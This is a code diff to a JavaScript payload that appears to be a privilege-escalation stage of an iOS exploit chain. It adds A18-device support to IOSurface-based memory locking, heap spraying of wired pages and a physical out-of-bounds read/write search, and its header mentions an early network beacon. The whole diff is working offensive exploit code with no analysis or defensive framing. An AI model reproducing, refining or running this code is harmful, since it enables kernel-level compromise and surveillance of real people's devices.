@@ -1,5 +1,5 @@
 (() => {
-  const LS_PE_PAYLOAD_REVISION = "20260904.11";
+  const LS_PE_PAYLOAD_REVISION = "20260904.12";
   const PE_ENABLE_DEBUG_NETWORK = globalThis.__pe_enable_debug_network === true;
   const LS_RETAIN_KRW_FOR_VISIBLE_TEST = false;
   // Ultra-early beacon - before fcall_init, using XMLHttpRequest if available
@@ -1835,14 +1835,34 @@
     socket_pcb_ids = [];
     socket_ports_count = 0n;
   }
+  let a18_iosurface_address_key = 0n;
+  let a18_iosurface_alloc_size_key = 0n;
   function create_surface_with_address(address, size) {
     let properties = CFDictionaryCreateMutable(kCFAllocatorDefault, 0n, kCFTypeDictionaryKeyCallBacks, kCFTypeDictionaryValueCallBacks);
     let address_ptr = new_uint64_t(address);
-    let address_number = CFNumberCreate(kCFAllocatorDefault, 11n, address_ptr);
-    CFDictionarySetValue(properties, create_cfstring(get_cstring("IOSurfaceAddress")), address_number);
+    let address_number = CFNumberCreate(kCFAllocatorDefault, is_a18_devices ? 4n : 11n, address_ptr);
+    let address_key = 0n;
+    if (is_a18_devices) {
+      if (a18_iosurface_address_key == 0n) {
+        a18_iosurface_address_key = create_cfstring(get_cstring("IOSurfaceAddress"));
+      }
+      address_key = a18_iosurface_address_key;
+    } else {
+      address_key = create_cfstring(get_cstring("IOSurfaceAddress"));
+    }
+    CFDictionarySetValue(properties, address_key, address_number);
     let size_ptr = new_uint64_t(size);
-    let size_number = CFNumberCreate(kCFAllocatorDefault, 9n, size_ptr);
-    CFDictionarySetValue(properties, create_cfstring(get_cstring("IOSurfaceAllocSize")), size_number);
+    let size_number = CFNumberCreate(kCFAllocatorDefault, is_a18_devices ? 4n : 9n, size_ptr);
+    let size_key = 0n;
+    if (is_a18_devices) {
+      if (a18_iosurface_alloc_size_key == 0n) {
+        a18_iosurface_alloc_size_key = create_cfstring(get_cstring("IOSurfaceAllocSize"));
+      }
+      size_key = a18_iosurface_alloc_size_key;
+    } else {
+      size_key = create_cfstring(get_cstring("IOSurfaceAllocSize"));
+    }
+    CFDictionarySetValue(properties, size_key, size_number);
     let surface = IOSurfaceCreate(properties);
     if (surface != 0n) IOSurfacePrefetchPages(surface);
     free(address_ptr);
@@ -1852,6 +1872,9 @@
     CFRelease(properties);
     return surface;
   }
+  const PE_A18_MAX_MLOCK = 4096n;
+  let a18_mlock_entries = 0n;
+  let a18_mlock_count = 0n;
   let mlock_dict = {};
   function surface_mlock(address, size, report_failure = true) {
     let surf = create_surface_with_address(address, size);
@@ -1864,16 +1887,55 @@
       }
       return false;
     }
-    mlock_dict[address] = surf;
+    if (is_a18_devices) {
+      // Lara keeps a fixed 4096-entry reference table; later created surfaces remain retained.
+      if (a18_mlock_count < PE_A18_MAX_MLOCK) {
+        if (a18_mlock_entries == 0n) {
+          a18_mlock_entries = calloc(PE_A18_MAX_MLOCK, 16n);
+          if (a18_mlock_entries == 0n) throw new Error("A18 IOSurface lock ledger allocation failed");
+        }
+        let entry = a18_mlock_entries + a18_mlock_count * 16n;
+        uwrite64(entry, address);
+        uwrite64(entry + 8n, surf);
+        a18_mlock_count++;
+      }
+    } else {
+      mlock_dict[address] = surf;
+    }
     return true;
   }
   function surface_munlock(address, size) {
+    if (is_a18_devices) {
+      for (let i = 0n; i < a18_mlock_count; i++) {
+        let entry = a18_mlock_entries + i * 16n;
+        if (uread64(entry) == address) {
+          let surf = uread64(entry + 8n);
+          if (surf != 0n) {
+            try { CFRelease(surf); } catch (_) {}
+            uwrite64(entry + 8n, 0n);
+          }
+          return;
+        }
+      }
+      return;
+    }
     if (mlock_dict[address] != undefined) {
       try { CFRelease(mlock_dict[address]); } catch (_) {}
     }
     delete mlock_dict[address];
   }
   function surface_munlock_all() {
+    if (a18_mlock_entries != 0n) {
+      for (let i = 0n; i < a18_mlock_count; i++) {
+        let surf = uread64(a18_mlock_entries + i * 16n + 8n);
+        if (surf != 0n) {
+          try { CFRelease(surf); } catch (_) {}
+        }
+      }
+      free(a18_mlock_entries);
+      a18_mlock_entries = 0n;
+      a18_mlock_count = 0n;
+    }
     for (let key of Object.keys(mlock_dict)) {
       if (mlock_dict[key] != undefined && mlock_dict[key] != 0n) {
         try { CFRelease(mlock_dict[key]); } catch (_) {}
@@ -2400,30 +2462,36 @@
     let read_buffer = calloc(1n, oob_size);
     let write_buffer = calloc(1n, oob_size);
     initialize_physical_read_write(n_of_oob_pages * PAGE_SIZE);
-    let getsockopt_read_length = 32n;
-    let getsockopt_read_data = calloc(1n, getsockopt_read_length);
     let wired_mapping_entry_size = PAGE_SIZE;
     let wired_mapping_entries_total_size = 1024n * 1024n * 1024n * 2n;
     let n_of_wired_mapping_entries = wired_mapping_entries_total_size / wired_mapping_entry_size;
-    let wired_mapping_entries_addresses = [];
+    let wired_mapping_entries_addresses = calloc(n_of_wired_mapping_entries, 8n);
+    let wired_entries_count = n_of_wired_mapping_entries;
+    LOG("[PE-A18] Lara allocation strategy native_entries=" + n_of_wired_mapping_entries +
+        " ledger_bytes=" + (n_of_wired_mapping_entries * 8n) +
+        " max_tracked_locks=" + PE_A18_MAX_MLOCK);
     LOG("[i] Allocating memory");
     let kr = KERN_SUCCESS;
     let wired_address = 0n;
+    let wired_address_ptr = new_uint64_t(0n);
     let wired_surface_lock_failures = 0n;
     for (let i = 0n; i < n_of_wired_mapping_entries; i++) {
       if (i == 0n) {
-        wired_address = new_bigint();
         do {
-          kr = mach_vm_allocate(mach_task_self(), get_bigint_addr(wired_address), wired_mapping_entry_size, VM_FLAGS_ANYWHERE);
+          uwrite64(wired_address_ptr, 0n);
+          kr = mach_vm_allocate(mach_task_self(), wired_address_ptr, wired_mapping_entry_size, VM_FLAGS_ANYWHERE);
+          wired_address = uread64(wired_address_ptr);
         } while (kr != KERN_SUCCESS);
       } else {
-        wired_address = BigInt(wired_mapping_entries_addresses.slice(-1));
+        wired_address = uread64(wired_mapping_entries_addresses + (i - 1n) * 8n);
         do {
           wired_address += wired_mapping_entry_size;
-          kr = mach_vm_allocate(mach_task_self(), get_bigint_addr(wired_address), wired_mapping_entry_size, VM_FLAGS_FIXED);
+          uwrite64(wired_address_ptr, wired_address);
+          kr = mach_vm_allocate(mach_task_self(), wired_address_ptr, wired_mapping_entry_size, VM_FLAGS_FIXED);
+          wired_address = uread64(wired_address_ptr);
         } while (kr != KERN_SUCCESS);
       }
-      wired_mapping_entries_addresses.push(wired_address);
+      uwrite64(wired_mapping_entries_addresses + i * 8n, wired_address);
       if (!surface_mlock(wired_address, wired_mapping_entry_size, !is_a18_devices) && is_a18_devices) {
         wired_surface_lock_failures++;
         if (wired_surface_lock_failures == 1n) {
@@ -2435,6 +2503,7 @@
       uwrite64(wired_address, wired_page_marker);
       uwrite64(wired_address + 0x8n, wired_address);
     }
+    free(wired_address_ptr);
     let target_inp_gencnt_list = [];
     if (wired_surface_lock_failures != 0n) {
       LOG("[PE-A18] wired IOSurface lock summary null=" + wired_surface_lock_failures +
@@ -2444,8 +2513,10 @@
     LOG("[i] Allocating memory done");
     while (true) {
       let search_mapping_size = 0x800n * PAGE_SIZE;
-      let search_mapping_address = new_bigint();
-      kr = mach_vm_allocate(mach_task_self(), get_bigint_addr(search_mapping_address), search_mapping_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
+      let search_mapping_address_ptr = new_uint64_t(0n);
+      kr = mach_vm_allocate(mach_task_self(), search_mapping_address_ptr, search_mapping_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
+      let search_mapping_address = uread64(search_mapping_address_ptr);
+      free(search_mapping_address_ptr);
       if (kr != KERN_SUCCESS) {
         LOG("[-] mach_vm_allocate failed!!!");
         exit(0n);
@@ -2480,13 +2551,21 @@
           LOG(`[i] seeking_offset: ${seeking_offset.hex()}: Found wired_page: ${wired_page.hex()}`);
           if (wired_pages.indexOf(wired_page) == -1) {
             wired_pages.push(wired_page);
-            let idx = wired_mapping_entries_addresses.indexOf(wired_page);
-            if (idx == -1) {
+            let idx = -1n;
+            for (let j = 0n; j < wired_entries_count; j++) {
+              if (uread64(wired_mapping_entries_addresses + j * 8n) == wired_page) {
+                idx = j;
+                break;
+              }
+            }
+            if (idx == -1n) {
               LOG(`[-] Found untracked wired_page; skipping dealloc: ${wired_page.hex()}`);
               seeking_offset += PAGE_SIZE;
               continue;
             }
-            wired_mapping_entries_addresses.splice(idx, 1);
+            wired_entries_count--;
+            uwrite64(wired_mapping_entries_addresses + idx * 8n,
+                     uread64(wired_mapping_entries_addresses + wired_entries_count * 8n));
             uwrite64(wired_page, 0n);
             uwrite64(wired_page + 0x8n, 0n);
           } else {
@@ -2552,14 +2631,18 @@
         break;
       }
     }
-    for (let i = 0n; i < BigInt(wired_mapping_entries_addresses.length); i++) {
-      let wired_page = wired_mapping_entries_addresses[i];
+    for (let i = 0n; i < wired_entries_count; i++) {
+      let wired_page = uread64(wired_mapping_entries_addresses + i * 8n);
       mach_vm_deallocate(mach_task_self(), wired_page, wired_mapping_entry_size);
     }
+    free(wired_mapping_entries_addresses);
+    free(read_buffer);
+    free(write_buffer);
     if (!is_a18_devices) {
       surface_munlock_all();
     } else {
-      LOG("[PE-A18] preserved IOSurface locks to match Lara pe_a18");
+      LOG("[PE-A18] preserved Lara-style IOSurface locks tracked=" + a18_mlock_count +
+          " max=" + PE_A18_MAX_MLOCK);
     }
   }
   function pe() {
